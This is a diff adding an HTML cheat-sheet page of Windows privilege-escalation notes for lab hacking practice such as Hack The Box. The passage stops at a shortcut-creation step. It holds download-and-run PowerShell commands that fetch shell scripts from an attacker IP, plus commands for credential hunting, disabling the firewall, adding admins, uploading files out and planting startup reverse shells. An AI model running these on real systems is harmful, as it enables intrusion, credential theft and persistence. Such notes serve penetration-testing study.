@@ -1,0 +1,2328 @@
+---
+layout: default
+---
+<html>
+
+<head>
+    <title>Windows PrivEsc</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Windows PrivEsc</h1>
+
+    <hr>
+
+    <h2>Manual PrivEsc:</h2>
+
+    <li>Use rlwrap on shell to enable arrow usage (up and down to navigate previous commands, left and right to navigate
+        text)</li>
+    <li>Check user groups and privileges</li>
+    <ul>
+        <li>whoami</li>
+        <li>whoami /all</li>
+        <li>whoami /priv</li>
+        <li>whoami /groups</li>
+        <li>net user &lt;username&gt;</li>
+        <ul>
+            <li>Get info about a specific user</li>
+        </ul>
+    </ul>
+
+    <li>Kernel exploit</li>
+    <ul>
+        <li>Google the last installed "hotfix + exploit"</li>
+        <li>Sherlock - predecessor to Watson</li>
+        <li>Watson</li>
+        <li>wes-ng</li>
+    </ul>
+
+    <li>Check folders</li>
+    <ul>
+        <li>Look for interesting files</li>
+        <li>C:\Users\*</li>
+        <li>C:\Program Files\</li>
+        <li>C:\Program Files (x86)\</li>
+    </ul>
+
+    <li>Check for credentials</li>
+    <ul>
+        <li>Autologin</li>
+        <ul>
+            <li>get-item -path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"</li>
+            <li>reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
+        </ul>
+
+        <li>Group Policy (GPP) passwords</li>
+        <li>C:\Windows\Panther\unattend.xml</li>
+    </ul>
+
+    <li>Cached credentials</li>
+    <table>
+        <tr>
+            <td>Check for cached credentials</td>
+            <td>cmdkey /list</td>
+        </tr>
+        <tr>
+            <td>Run command under context of a cached credential</td>
+            <td>runas /user:&lt;user&gt; /savecred "&lt;command&gt;"</td>
+        </tr>
+        <tr>
+            <td>Example</td>
+            <td>
+                <pre>cmdkey /list&#13;&#10;&#13;&#10;Currently stored credentials:&#13;&#10;                        &#13;&#10;Target: Domain:interactive=ACCESS\Administrator&#13;&#10;Type: Domain Password&#13;&#10;User: ACCESS\Administrator&#13;&#10;                            &#13;&#10;runas /user:ACCESS\Administrator /savecred &quot;powershell iex(new-object net.webclient).downloadstring(&apos;http://10.10.14.77/shell.ps1&apos;)&quot;</pre>
+            </td>
+        </tr>
+
+        <li>If credentials are cached then we can find the cleartext password using mimikatz</li>
+        <ul>
+            <li>https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/</li>
+            <li>HTB: Access</li>
+        </ul>
+    </table>
+
+    <li>Check running processes, pay attention to admin</li>
+    <ul>
+        <li>tasklist /V</li>
+        <li>Most application exploits are the same as other misconfigurations (weak folder configurations, unquoted
+            service paths, etc)</li>
+    </ul>
+
+    <li>Open ports</li>
+    <ul>
+        <li>netstat -an</li>
+        <ul>
+            <li>Ports listening on local host</li>
+            <li>Ones not listed during nmap scan/firewalled</li>
+        </ul>
+    </ul>
+
+
+    <li>Installed programs/applications</li>
+    <ul>
+        <li>List applications that are installed by the Windows Installer</li>
+        <ul>
+            <li>wmic product get name, version, vendor</li>
+        </ul>
+    </ul>
+
+    <li>Insecure Services</li>
+    <ul>
+        <li>AllAccess, Start</li>
+        <ul>
+            <li>Change binpath</li>
+        </ul>
+    </ul>
+
+    <li>Startup Apps/autorun</li>
+    <ul>
+        <li>Important if we can reboot the box</li>
+    </ul>
+
+    <li>Privilege Abuse</li>
+    <ul>
+        <li>SeLoadDriverPrivilege</li>
+        <li>SeImpersonatePrivilege</li>
+        <li>SeImpersonatePrivilege</li>
+        <li>SeAssignPrimaryPrivilege</li>
+        <li>SeTcbPrivilege</li>
+        <li>SeBackupPrivilege</li>
+        <ul>
+            <li>https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
+            </li>
+        </ul>
+        <li>SeRestorePrivilege</li>
+        <li>SeCreateTokenPrivilege</li>
+        <li>SeLoadDriverPrivilege</li>
+        <li>SeTakeOwnershipPrivilege</li>
+        <li>SeDebugPrivilege</li>
+
+        <br>
+
+        <li>Article on exploiting privileges:
+            https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
+        </li>
+    </ul>
+
+    <li>Always Install Elevated</li>
+    <ul>
+        <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
+        <ul>
+            <li>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</li>
+        </ul>
+
+        <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
+        <ul>
+            <li>reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated</li>
+        </ul>
+
+        <li>Create msi reverse shell and execute it</li>
+        <ul>
+            <li>msiexec /qn /i shell.msi</li>
+        </ul>
+    </ul>
+
+    <li>Abuse GUI Program running as admin</li>
+    <ul>
+        <li>Inside application open file: file://c:/windows/system32/cmd.exe</li>
+        <ul>
+            <li>Might get admin command prompt</li>
+        </ul>
+    </ul>
+
+    <li>Look for exploits for 3rd party drivers</li>
+    <ul>
+        <li>Enumerate drivers</li>
+        <ul>
+            <li>driverquery /v</li>
+            <li>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object&OpenCurlyQuote;Display
+                Name&rsquor;, &OpenCurlyQuote;Start Mode&rsquor;, Path</li>
+        </ul>
+        <li>Enumerate Driver Versions</li>
+        <ul>
+            <li>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer
+                | Where-Object {$_.DeviceName -like &quot;*VMware*&quot;}</li>
+        </ul>
+    </ul>
+
+    <li>Search the registry for keys and values that contain &quot;password&quot;:</li>
+    <ul>
+        <li>reg query HKLM /f password /t REG_SZ /s</li>
+        <li>reg query HKCU /f password /t REG_SZ /s</li>
+        <li>reg query &quot;HKLM\software\microsoft\windows nt\currentversion\winlogon&quot;</li>
+        <li>reg query &quot;HKCU\software\simontatham\putty\sessions&quot; /s</li>
+        <li>reg query HKLM\System\ControlSet001\Control\CurrentPass</li>
+        <li>reg query HKLM\System\ControlSet002\Control\CurrentPass</li>
+        <li>HKLM\System\CurrentControlSet\Control\CurrentPass</li>
+    </ul>
+
+    <li>Scheduled Tasks</li>
+    <ul>
+        <li>schtasks /query /fo LIST /v</li>
+    </ul>
+
+    <li>mysql</li>
+    <ul>
+        <li>run commands as mysql user</li>
+        <ul>
+            <li>raptor_winudf</li>
+        </ul>
+        <li>Search for creds</li>
+    </ul>
+
+    <li>Login or run commands as other user using credentials or hashes</li>
+    <ul>
+        <li>Powershell</li>
+        <li>psexec</li>
+        <li>winrm</li>
+        <li>wmiexec</li>
+        <li>pth-winexe</li>
+    </ul>
+
+    <li>Active Directory attacks</li>
+    <ul>
+        <li>ASREPRoast</li>
+        <ul>
+            <li>If there are users without kerberos pre-auth required.</li>
+        </ul>
+        <li>Kerberoast</li>
+        <ul>
+            <li>If able to authenticate as a user.</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>PrivEsc Tools</h2>
+
+    <li>Powerup.ps1</li>
+    <ul>
+        <li>IEX(New-Object Net.WebClient).downloadString('http://&lt;ip address&gt;/PowerUp.ps1&#039;)</li>
+        <li>Invoke-AllChecks</li>
+    </ul>
+    <li>Winpeas</li>
+    <li>Seatbelt</li>
+    <li>Windows-Privesc-Checker</li>
+    <li>Windows Exploit Suggester - Next Generation</li>
+    <ul>
+        <li>wesng.py /systeminfo.txt -i 'Elevation of Privilege' --exploits-only</li>
+    </ul>
+    <li>Metasploit</li>
+    <li>Bloodhound</li>
+    <ul>
+        <li>Use against DC</li>
+        <li>Clone repo for most up-to-date version</li>
+        <ul>
+            <li>Repo does not include the bloodhound executable, this must be downloaded separately from releases</li>
+        </ul>
+
+        <li>Usage instructions:</li>
+        <ul>
+            <li>Start neo4j on Kali</li>
+            <ul>
+                <li>run: neo4j console</li>
+                <ul>
+                    <li>Default credentials - neo4j:neo4j</li>
+                    <ul>
+                        <ul>
+                            <li>Reset credentials:</li>
+                        </ul>
+                        <li>locate neo4j | grep auth</li>
+                        <li>Delete Delete /usr/share/neo4j/data/dbms</li>
+                    </ul>
+                </ul>
+            </ul>
+            <li>Run collector/ingestor on victim AD DC machine</li>
+            <ul>
+                <li>Locally with executable: .\Sharphound.exe -c all</li>
+                <li>Remotely using python: sudo python3 bloodhound.py -c all -u &lt;user&gt; -p
+                    &#039;&lt;password&gt;&#039; -ns &lt;ip&gt; -d &lt;domain name&gt; --zip</li>
+            </ul>
+            <li>Start bloodhound on Kali</li>
+            <ul>
+                <li>sudo ./Bloodhound --no-sandbox</li>
+            </ul>
+            <li>Drag and drop file generated by sharphound into Bloodhound window</li>
+            <li>On top left where it says "Search for a node" enter the username that is being used on the victim
+                machine</li>
+            <li>right click icon in center with pwned victim machine user and "Mark User as Owned"</li>
+            <li>Things to check under Queries/Analysis tab</li>
+            <ul>
+                <li>Shortest Paths from Kerberoastable Users</li>
+                <li>Shortest path from Owned principles</li>
+                <li>Shortest path to High Value Targets</li>
+            </ul>
+
+            <li>Can right click on account associations and select "Help" and it will give info how an AD association
+                can be abused</li>
+        </ul>
+    </ul>
+
+    <li>SharpCollection</li>
+    <ul>
+        <li>Common C# offensive tools that are checked for updates daily, and then compiled</li>
+    </ul>
+
+    <hr>
+
+    <h2>cmd Commands</h2>
+
+    <li>Location: C:\Windows\System32\cmd.exe</li>
+    <li>Miscellaneous</li>
+    <table>
+        <tr>
+            <td>Base64 encode file</td>
+            <td>certutil encode &lt;file&gt; &lt;output name&gt;</td>
+        </tr>
+        <tr>
+            <td>grep string from output</td>
+            <td>&lt;command&gt; | findstr</td>
+        </tr>
+    </table>
+
+    <li>System Information & Control</li>
+    <table>
+        <tr>
+            <td>show hostname</td>
+            <td>hostname</td>
+        </tr>
+        <tr>
+            <td>Restart</td>
+            <td>
+                <li>shutdown -r -t 10 && exit</li>
+                <ul>
+                    <li>&& exit because an error message can pop up when initiating a restart with a shell still active.
+                    </li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>List system-wide updates</td>
+            <td>wmic qfe get Caption, Description, HotFixID, InstalledOn</td>
+        </tr>
+        <tr>
+            <td>List version and architecture</td>
+            <td>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"</td>
+        </tr>
+        <tr>
+            <td>List version and architecture</td>
+            <td>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"</td>
+        </tr>
+        <tr>
+            <td>Enumerate drivers installed</td>
+            <td>driverquery /v</td>
+        </tr>
+        <tr>
+            <td>View statistics</td>
+            <td>net statistics</td>
+        </tr>
+    </table>
+
+    <li>Applications & Services</li>
+    <table>
+        <tr>
+            <td>List running services</td>
+            <td>tasklist</td>
+        </tr>
+        <tr>
+            <td>Running Processes & Services</td>
+            <td>tasklist /SVC</td>
+        </tr>
+    </table>
+
+    <li>User & Group Permissions</li>
+    <table>
+        <tr>
+            <td>view current user</td>
+            <td>
+                <li>whoami</li>
+                <li>echo %username%</li>
+            </td>
+        </tr>
+        <tr>
+            <td>See all user accounts</td>
+            <td>net user</td>
+        </tr>
+        <tr>
+            <td>More details about specific account</td>
+            <td>net user &lt;username&gt;</td>
+        </tr>
+        <tr>
+            <td>View domain users</td>
+            <td>net user /domain</td>
+        </tr>
+        <tr>
+            <td>View local administrators group</td>
+            <td>net localgroup Administrators</td>
+        </tr>
+        <tr>
+            <td>View groups</td>
+            <td>net group </td>
+        </tr>
+        <tr>
+            <td>Shows all groups on the domain</td>
+            <td>net group /domain</td>
+        </tr>
+        <tr>
+            <td>net accounts</td>
+            <td>Check accounts info (password lockout, etc)</td>
+        </tr>
+        <tr>
+            <td>Add user</td>
+            <td>net user &lt;username&gt; &lt;password&gt; /add</td>
+        </tr>
+        <tr>
+            <td>Add user to domain</td>
+            <td>net user &lt;username&gt; &lt;password&gt; /add /domain</td>
+        </tr>
+        <tr>
+            <td>Change password</td>
+            <td>net user &lt;username&gt; &lt;password&gt;</td>
+        </tr>
+        <tr>
+            <td>View users in a group</td>
+            <td>net group &quot;&lt;Group Name&gt;&quot;</td>
+        </tr>
+        <tr>
+            <td>Add user to a group</td>
+            <td>net group "Group Name" /add &lt;user&gt;</td>
+        </tr>
+        <tr>
+            <td>Make user a local admin</td>
+            <td>net localgroup administrators &lt;username&gt; /add</td>
+        </tr>
+        <tr>
+            <td>Give full control of file to user</td>
+            <td>cacls &lt;file&gt; /t /e /p &lt;user&gt;:F<br>- F = Full Control</td>
+        </tr>
+        <tr>
+            <td>Remove access to file from user</td>
+            <td>cacls &lt;file&gt; /r /e &lt;user&gt;</td>
+        </tr>
+    </table>
+
+    <li>File System</li>
+    <table>
+        <tr>
+            <td>Edit text document</td>
+            <td>Copy con C:\file.txt</td>
+        </tr>
+        <tr>
+            <td>Search for files</td>
+            <td>dir &lt;file name&gt;
+                <table>
+                    <tr>
+                        <td>/s</td>
+                        <td>List all occurrences of the file in the specified directory and subdirectories</td>
+                    </tr>
+                    <tr>
+                        <td>/r</td>
+                        <td>
+                            <li>Display alternate data streams of the file (files that are acting like folders and
+                                contain files inside of them)</li>
+                            <ul>
+                                <li>If data stream files are found, display content with Powershell: (Get-Content
+                                    &lt;main file&gt; -Stream &lt;File inside the file&gt;</li>
+                            </ul>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Find file</td>
+            <td>where &lt;file name&gt;<br>where /r C:\ &lt;file name&gt;<br>where /R C:\ &lt;file name&gt;</td>
+        </tr>
+        <tr>
+            <td>Mount smb share</td>
+            <td>net use &lt;drive letter&gt;: \\&lt;SMB Server ip&gt;\&lt;smb share to mount&gt;</td>
+        </tr>
+        <tr>
+            <td>List all drives that are currently mounted as well as unmounted but connected</td>
+            <td>mountvol</td>
+        </tr>
+        <tr>
+            <td>Analyze encrypted files</td>
+            <td>cipher /c &lt;file&gt;</td>
+        </tr>
+        <tr>
+            <td>Check file permissions</td>
+            <td>cacls &lt;file&gt;</td>
+        </tr>
+    </table>
+
+    <li>Networking</li>
+    <table>
+        <tr>
+            <td>Disable firewall - New way</td>
+            <td>netsh advfirewall set allprofiles state off</td>
+        </tr>
+        <tr>
+            <td>Disable Firewall - Old way</td>
+            <td>netsh firewall set opmode disable</td>
+        </tr>
+        <tr>
+            <td>Disable firewall service (can only run as SYSTEM?)</td>
+            <td>net stop mpssvc</td>
+        </tr>
+        <tr>
+            <td>Current firewall profile</td>
+            <td>netsh advfirewall show currentprofile</td>
+        </tr>
+        <tr>
+            <td>Firewall rules</td>
+            <td>netsh advfirewall firewall show rule name=all</td>
+        </tr>
+        <tr>
+            <td>Show open ports</td>
+            <td>netstat -ano</td>
+        </tr>
+        <tr>
+            <td>Network Information</td>
+            <td>ipconfig /all</td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h2>Powershell Commands</h2>
+
+    <li>System Information & Control</li>
+    <table>
+        <tr>
+            <td>Enumerate drivers</td>
+            <td>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object&OpenCurlyQuote;Display
+                Name&rsquor;, &OpenCurlyQuote;Start Mode&rsquor;, Path</td>
+        </tr>
+        <tr>
+            <td>Enumerate driver versions</td>
+            <td>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer
+                | Where-Object {$_.DeviceName -like &quot;*VMware*&quot;}</td>
+        </tr>
+        <tr>
+            <td>Check operating system architecture</td>
+            <td>[environment]::Is64BitOperatingSystem</td>
+        </tr>
+        <tr>
+            <td>Check powershell session architecture</td>
+            <td>[environment]::Is64BitProcess<br>
+                <li>64-bit powershell</li>
+                <ul>
+                    <li>C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Environment variabels</td>
+            <td>dir env:</td>
+        </tr>
+        <tr>
+            <td>Get time & date</td>
+            <td>Get-Date</td>
+        </tr>
+        <tr>
+            <td>Check execution mode</td>
+            <td>$ExecutionContext.SessionState.LanguageMode</td>
+        </tr>
+        <tr>
+            <td>Powershell history</td>
+            <td>C:\Users\&lt;user&gt;\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
+            </td>
+        </tr>
+    </table>
+
+    <li>User & Group Permissions</li>
+    <table>
+        <tr>
+            <td>Create Credential Variable</td>
+            <td>$pass = ConvertTo-SecureString &#039;&lt;password&gt;&#039; -AsPlainText -Force<br>$cred = New-Object
+                System.Management.Automation.PSCredential(&#039;&lt;Username&gt;&#039;, $pass)</td>
+        </tr>
+        <tr>
+            <td>Decrypt SecureString password to plaintext from CLI XML file.</td>
+            <td>(Import-CliXml -Path user.txt).GetNetworkCredential().Password</td>
+        </tr>
+        <tr>
+            <td>Query user information</td>
+            <td>Get-ADUser &lt;user&gt; [-properties *]</td>
+        </tr>
+        <tr>
+            <td>View service permissions</td>
+            <td>
+                <li>$acl = get-acl HKLM:\System\CurrentControlSet\Services</li>
+                <li>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}
+                </li>
+            </td>
+        </tr>
+    </table>
+
+    <li>File System</li>
+    <table>
+        <tr>
+            <td>Read file content</td>
+            <td>Get-Content &lt;file name&gt;<br>gc &lt;file name&gt;</td>
+        </tr>
+        <tr>
+            <td>Check file/folder permissions</td>
+            <td>Get-ACL &lt;file/folder&gt; | Fl *</td>
+        </tr>
+        <tr>
+            <td>View file contents</td>
+            <td>(Get-Content &lt;file&gt;).substring(0,16)</td>
+        </tr>
+        <tr>
+            <td>Search for file</td>
+            <td>Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force
+            </td>
+        </tr>
+        <tr>
+            <td>Recursively show file names</td>
+            <td>gci -recurse | select FullName</td>
+        </tr>
+        <tr>
+            <td>Show only files</td>
+            <td>gci -File</td>
+        </tr>
+        <tr>
+            <td>Ignore errors</td>
+            <td>-ErrorAction SilentlyContinue<br>ErrorAction ignore</td>
+        </tr>
+        <tr>
+            <td>Parse .lnk files</td>
+            <td>
+                <pre>$WScript = New-Object -ComObject WScript.Shell&#13;&#10;$SC = Get-ChildItem *.lnk&#13;&#10;$WScript.CreateShortcut($sc)</pre>
+            </td>
+        </tr>
+    </table>
+
+    <li>Miscellaneous</li>
+    <table>
+        <tr>
+            <td>Secretly run scripts</td>
+            <td>powershell.exe -ExecutionPolicy Bypass –NoLogo –NonInteractive –NoProfile –File &lt;file.ps1&gt;</td>
+        </tr>
+        <tr>
+            <td>enable colors</td>
+            <td>reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</td>
+        </tr>
+        <tr>
+            <td>dot-source / load all variables & functions from powershell script</td>
+            <td>
+                <li>.\&lt;script&gt;.ps1</li>
+                <li>iex (New-Object
+                    System.Net.Webclient).DownloadString(&#039;https://website.com/url/to/file.ps1&#039;)</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Enable RDP</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Enable RDP service</td>
+                        <td>Set-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Terminal Server&apos; -name &quot;fDenyTSConnections&quot; -value 0</td>
+                    </tr>
+                    <tr>
+                        <td>Set firewall rules</td>
+                        <td>Enable-NetFirewallRule -DisplayGroup "Remote Desktop"</td>
+                    </tr>
+                    <tr>
+                        <td>Enable restricted admin RDP login</td>
+                        <td>New-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Lsa&apos;  -Name &apos;DisableRestrictedAdmin&apos; -Value 0 -PropertyType DWORD</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h2>File Transfers</h2>
+
+    <li>Download to Windows</li>
+    <table>
+        <tr>
+            <td>Base64 Decoding</td>
+            <td>powershell -e &lt;base 64&gt;</td>
+        </tr>
+        <tr>
+            <td>Download file</td>
+            <td>
+                <li>invoke-webrequest -Uri http://&lt;ip address&gt;/shell.exe [-OutFile &lt;file&gt;]</li>
+                <li>IWR -Uri &lt;url&gt; [-OutFile &lt;file&gt;]</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Download file with Powershell</td>
+            <td>
+                <li>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip
+                    address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)</li>
+                <li>powershell &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip
+                    address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)&quot;</li>
+                <li>(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip
+                    address&gt;/shell.ps1&#039;,&lt;output directory and file name&gt;&#039;)</li>
+                <li>wget &lt;url&gt; -outfile &lt;file name&gt;</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Download file with cmd</td>
+            <td>certutil -urlcache -split -f http://&lt;ip address&gt;/&lt;file name&gt; C:\\&lt;output directory and
+                file name&gt;</td>
+        </tr>
+        <tr>
+            <td>Download and run powershell script</td>
+            <td>
+                <li>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://&lt;ip
+                    address&gt;/shell.ps1&apos;)&quot;</li>
+                <li>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://&lt;ip
+                    address&gt;/shell.ps1&apos;)&quot;</li>
+                <li>IEX(IWR http://&lt;ip address&gt;/shell.ps1 -UseBasicParsing)</li>
+                <li>IEX(IWR(&lt;url&gt;))</li>
+            </td>
+        </tr>
+        <tr>
+            <td>SMB</td>
+            <td>
+                <li>Mount SMB share using powershell to new drive and using powershell credential object</li>
+                <table>
+                    <tr>
+                        <td>Start SMB share on Kali</td>
+                        <td>
+                            <li>impacket-smbserver &lt;Share Name&gt; &lt;Directory of Share&gt; -smb2support -user
+                                &lt;Username to connect to share&gt; -password &lt;Password to connect to share&gt;</li>
+                            <li>Some machines do not work with smb2support. Other machines require it.</li>
+                            <li>Credentials optional. Can skip next step if not used.</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Create SMB Share Credential Variable</td>
+                        <td>
+                            <li>$pass = ConvertTo-SecureString &#039;&lt;password&gt;&#039; -AsPlainText -Force</li>
+                            <li>$cred = New-Object
+                                System.Management.Automation.PSCredential(&#039;&lt;Username&gt;&#039;, $pass)</li>
+                            <ul>
+                                <li>If it is a domain account then:</li>
+                                <ul>
+                                    <li>$cred = New-Object
+                                        System.Management.Automation.PSCredential(&#039;&lt;Domain&gt;\&lt;Username&gt;&#039;,
+                                        $pass)</li>
+                                </ul>
+                                <li>Verify $cred creation by echoing it</li>
+                            </ul>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Connect to SMB Share From Windows</td>
+                        <td>
+                            <li>New-PSDrive -Name &lt;Drive Name for SMB Share&gt; -PSProvider FileSystem -Credential
+                                $cred -Root \\&lt;ip of attacker&gt;\&lt;Share Name&gt;</li>
+                            <li>If accessing the same share from multiple shells on the same windows machine it works
+                                best to give them each different drive names (-Name &lt;Name&gt;)</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Open SMB Share on Windows</td>
+                        <td>&lt;Drive Name Assigned to SMB Share&gt;:</td>
+                    </tr>
+                </table>
+
+                <li>Mount SMB share using cmd and simple credentials</li>
+                <table>
+                    <tr>
+                        <td>Create SMB Share</td>
+                        <td>sudo impacket-smbserver &lt;Share Name&gt; &lt;Share Directory&gt; -smb2support -user
+                            &lt;username&gt; -password &lt;password&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Connect to share</td>
+                        <td>net use \\&lt;ip address&gt;\&lt;share name&gt; /u:&lt;username&gt; &lt;password&gt;<br>net
+                            use x: \\&lt;ip&gt;\&lt;share name&gt; /u:&lt;user&gt; &lt;password&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Open share</td>
+                        <td>cd \\&lt;ip address&gt;\&lt;share name&gt;\</td>
+                    </tr>
+                </table>
+
+                <li>Create SMB share using Linux's built-in SMB server</li>
+                <table>
+                    <tr>
+                        <td>Create SMB Share (optional and self-explanatory parameters included)</td>
+                        <td>
+                            <li>sudo vi /etc/samba/smb.conf</li>
+                            <li>[share]</li>
+                            <li>comment = My Share</li>
+                            <li>browseable = yes</li>path = /srv/SMB
+                            <li>read only = no</li>
+                            <li>guest ok = yes</li>
+                            <li>writable = yes</li>
+                            <li>create mask = 0777</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Might need to give SMB permissions to share directory</td>
+                        <td>
+                            <li>chmod 777 &lt;smb share directory&gt;</li>
+                            <li>chmod 755 &lt;smb share directory&gt;</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Start Share</td>
+                        <td>service smbd restart</td>
+                    </tr>
+                </table>
+
+                <li>Troubleshoot by using smbclient and access the SMB directory on our machine and attempt to retrieve
+                    or upload files.</li>
+            </td>
+        </tr>
+    </table>
+
+    <li>Upload to windows</li>
+    <table>
+        <tr>
+            <td>Upload with Powershell to Web Server</td>
+            <td>
+                <li>Invoke-RestMethod -Method PUT -Uri &quot;http://&lt;ip address&gt;:&lt;port&gt;/&lt;file
+                    name&gt;&quot; -Body $variable</li>
+                <li>powershell (New-Object System.Net.WebClient).UploadFile(&#039;http://&lt;ip address&gt;/&lt;file
+                    name&gt;&#039;, &#039;&lt;file name&gt;&#039;)</li>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <li>Upload to tftp</li>
+                <ul>
+                    <li>tftp is only on Windows until XP & 2003</li>
+                </ul>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Setup TFTP on Kali</td>
+                        <td>sudo apt install atftp</td>
+                    </tr>
+                    <tr>
+                        <td>Create tftp Directory</td>
+                        <td>sudo mkdir /tftp</td>
+                    </tr>
+                    <tr>
+                        <td>Set owner "nobody" on tftp Directory</td>
+                        <td>sudo chown nobody: /tftp</td>
+                    </tr>
+                    <tr>
+                        <td>Activate tftp server on port 69</td>
+                        <td>sudo atftpd --daemon --port 69 /tftp</td>
+                    </tr>
+                    <tr>
+                        <td>Upload file from Windows to Linux</td>
+                        <td>tftp -i &lt;ip address&gt; put file.txt</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Base64 Encoding</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>base64 w/ powershell</td>
+                        <td>
+                            <li>$fc = Get-Content &lt;file&gt;</li>
+                            <li>$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)</li>
+                            <li>[System.Convert]::ToBase64String($fe)</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Read file with Kali</td>
+                        <td>echo -n &lt;base64 text&gt; | base64 -d</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Upload with powercat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Set listener on receiving machine</td>
+                        <td>nc -lvnp &lt;port #&gt; &gt; receiving_file.ps1</td>
+                    </tr>
+                    <tr>
+                        <td>Send file with PowerCat</td>
+                        <td>powercat -c &lt;ip address&gt; -p &lt;port #&gt; -i C:\&lt;Directory and file name&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <li>Upload from Windows</li>
+    <table>
+        <tr>
+            <td>Upload to Linux web server</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload server creation</td>
+                        <td>
+                            <table>
+                                <tr>
+                                    <td>Create upload.php in /var/www/html</td>
+                                    <td>
+                                        <pre>&lt;?php&#13;&#10;$uploaddir = &apos;/var/www/uploads/&apos;;&#13;&#10;$uploadfile = $uploaddir . $_FILES[&apos;file&apos;][&apos;name&apos;];&#13;&#10;move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $uploadfile)&#13;&#10;?&gt;</pre>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>Create directory to upload to</td>
+                                    <td>
+                                        <li>mkdir /var/www/uploads</li>
+                                        <li>sudo chown www-data: /var/www/uploads</li>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>Start web server</td>
+                                    <td>sudo systemctl start apache2</td>
+                                </tr>
+                            </table>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Upload file</td>
+            <td>powershell (New-Object System.Net.WebClient).UploadFile(&apos;http://&lt;ip
+                address&gt;/upload.php&apos;, &apos;&lt;file&gt;&apos;)</td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h2>Startup Apps</h2>
+
+    <li>Program for startup apps that should start for all users (including admin):</li>
+    <ul>
+        <li>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</li>
+        <li>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</li>
+        <ul>
+            <li>Directory</li>
+            <li>if we have access, we can add a reverseShell.exe, and when admin logs in we will get a admin priv
+                reverse shell.</li>
+        </ul>
+
+        <li>Check access to directory with accesschk.exe:</li>
+        <ul>
+            <li>accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"</li>
+        </ul>
+
+        <li>files in StartUp directory must be shortcuts (.lnk)</li>
+        <ul>
+            <li>VBScript to create a shortcut file:</li>
